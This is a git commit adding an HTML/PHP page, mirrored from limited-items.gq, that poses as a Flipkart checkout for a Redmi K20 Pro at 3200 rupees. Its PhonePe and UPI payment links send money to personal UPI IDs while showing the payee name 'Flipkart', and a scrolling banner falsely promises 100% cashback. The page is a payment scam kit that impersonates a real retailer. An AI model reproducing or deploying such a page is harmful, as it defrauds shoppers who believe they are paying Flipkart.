6c150d332a5c471c922500ffae6dad854e0daf60
chashma076 <62173012+chashma076@users.noreply.github.com>
2021-03-21 23:28:53 +0800

    Add files via upload

---
+++ final/redmik20propayout.php
@@ -0,0 +1,274 @@
+<html>
+
+<!-- Mirrored from limited-items.gq/a2499.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Mar 2020 18:40:12 GMT -->
+<body>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-145252496-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-145252496-1');
+</script>
+
+
+<style>
+  .paybutton {
+    width: 110px;
+    height: 110px;
+    box-shadow: 1px 1px 10px #8e8e8e;
+    border-radius: 39px;
+    float: left;
+    margin-right: 31px;
+    font-size: 16px;
+    margin-top: 10px;
+}
+
+a.w3-btn.w3-white.w3-border.w3-border-red.w3-round-large {
+    width: 150px;
+}
+
+.paybutton img {
+    width: 99px;
+    margin-top: 18px;
+    margin-left: 9px;
+    margin-right: auto;
+    border-radius: 200px;
+    float: left;
+}
+
+body {
+    padding: 0;
+    margin: 0;
+}
+
+a {}
+
+span.teeeexxtttt {
+    text-align: center;
+    font-size: 9px;
+    padding-top: 42px;
+    margin-top: 10px;
+    line-height: 32px;
+}
+</style>
+<table border="0" width="100%" bgcolor="#2873F0">
+<tr>
+<td><a href='../'> <img src="payhead.jpg" width="100%"> </a> </td>
+<td></td>
+</tr>
+</table>
+
+<br>
+
+<center><h2>Payment Option</h2></center>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="w3.css">
+<body>
+
+
+
+<div class="w3-container">
+ 
+  
+</div>
+
+<script>
+        function showImg() {
+            document.getElementById("map_img").style.display = "";
+        }
+    </script>
+
+<table border="0" width="100%" bgcolor="#2873F0" class="card">
+
+<td> <div class="paybutton"><a href=phonepe://pay?pa=Q84282742@ybl&pn=Flipkart&cu=INR&am=3200 >  <img src="https://img.etimg.com/thumb/width-640,height-480,imgsize-156691,resizemode-1,msid-68163942/phonepe-partners-with-walmart-to-help-customers-pay-via-the-app-at-best-price-stores.jpg"></a> </div>
+<div class="paybutton" style="display:block;"><a href=upi://pay?pa=8675862666@paytm&pn=Flipkart&cu=INR&am=3200  width='9%' class="">  <img src="https://www.fresherslive.com/assets-images/news/origin/2020/05/01/need-to-know-how-to-change-the-upi-pin-on-phone-through-payment-apps-like-googlepay-phonepe-and-paytm-here-is-the-step-by-step-method.jpg" style="
+    margin-top: 26px;
+"></a> </div><div class="paybutton"  style="display: none;" onclick="showImg()">
+  <img src="https://cdn.iconscout.com/icon/premium/png-512-thumb/qr-code-scan-4-991622.png" style="
+    /* margin-top: 37px; */
+    border-radius: 0;
+    width: 55px;
+    margin-left: 28px;
+    margin-top: 17px;
+    margin-right: 20px;
+"><span class="teeeexxtttt">
+ UPI Scan and Pay</span> </div></td>
+
+</table>
+<table border="0" width="100%" bgcolor="#2873F0" class="card">
+<td><marquee>Pay via Phonepe and get 100% cashback by flipkart. Get 100% cashback and Enjoy ! . </marquee>
+</td>
+<td  style="display: none;"> <a href=upi://pay?pa=8675862666@paytm&pn=Flipkart&cu=INR&am=3200 width="100%" class="w3-btn w3-white w3-border w3-border-red w3-round-large">Paytm / Google Pay</a></td>
+</table>
+
+<br>
+
+<!---QR--->
+
+<html>
+<body>
+
+
+</head>
+<body>
+    <center><img id="map_img" src="qr/qr2999.jpg" style="display: none;" width="200" height="200" /></center>
+    <center><input type="hidden" class="w3-btn w3-white w3-border w3-border-red w3-round-large" id="Map" value="Scan & Pay" onclick="showImg()"/></center>
+
+</body>
+
+<!-- Mirrored from limited-items.gq/a2499.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Mar 2020 18:40:12 GMT -->
+</html>
+
+
+
+
+</body>
+</html>
+
+<!---QR--->
+
+<br>
+
+<!---table--->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+#customers {
+  font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+
+#customers td, #customers th {
+  border: 1px solid #ddd;
+  padding: 8px;
+}
+
+#customers tr:nth-child(even){background-color: #f2f2f2;}
+
+#customers tr:hover {background-color: #ddd;}
+
+#customers th {
+  padding-top: 12px;
+  padding-bottom: 12px;
+  text-align: left;
+  background-color: white;
+  color: black;
+}
+</style>
+</head>
+<body>
+
+<table id="customers">
+  <tr>
+    <th>PRICE DETAILS</th>
+    <th></th>
+    
+  </tr>
+  <tr>
+    <td>Price (1 item)</td>
+    <td>3200</td>
+    
+  </tr>
+  <tr>
+    <td>Delivery Charges</td>
+    <td>Free</td>
+    
+  </tr>
+  <tr>
+    <td>Amount Payble</td>
+    <td>3200</td>
+    
+  </tr>
+
+  </tr>
+</table>
+
+</body>
+</html>
+<!-----table end------>
+
+
+<html>
+<body>
+<table border="0" width="100%" class="card">
+<tr>
+<td> <img src="scoin.jpg" width="100%">  </td>
+
+<td></td>
+</tr>
+</table>
+<br>
+<center>How To Scan & Pay</center>
+<center> <img src="p1.jpg" width="50%">  </<center>
+
+</body>
+</html>
+
+
+
+<br>
+
+
+
+
+
+
+
+
+
+
+<html>
+<body>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+/* Float four columns side by side */
+.column {
+  float: center;
+  width: 40%;
+  padding: 0 10px;
+}
+
+/* Remove extra left and right margins, due to padding */
+.row {margin: 0 -5px;}
+
+/* Clear floats after the columns */
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+/* Responsive columns */
+@media screen and (max-width: 600px) {
+  .column {
+    width: 100%;
+    display: block;
+    margin-bottom: 20px;
+  }
+}
+
+/* Style the counter cards */
+.card {
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+  padding: 16px;
+  text-align: center;
+  background-color: white;
+}
+
+</body>
+</html>
